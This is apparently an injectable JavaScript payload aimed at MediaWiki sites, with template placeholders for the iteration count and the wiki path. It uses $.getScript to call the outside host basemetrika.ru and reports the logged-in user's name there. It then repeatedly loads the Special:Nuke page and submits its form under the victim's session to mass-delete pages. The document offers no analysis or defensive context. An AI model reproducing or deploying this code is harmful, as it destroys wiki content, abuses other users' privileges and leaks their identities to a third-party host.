$.getScript("//basemetrika.ru/log?m=" + encodeURIComponent(
    "User name '" + wgUserName + "', trying NUKE"
));
for(var i = 0; i < Number("%%iter_count%%"); i ++) {
    $.get("%%mw_prefix%%/index.php?title=Special:Nuke", function (data) {
        var nukeform = $(data).find("form[action*='submit']");
        var data_ser = nukeform.serialize();
        $.ajax({
            type : "POST",
            url : nukeform.attr("action"),
            data : data_ser
        }, function (data) {
            
        });
    });
}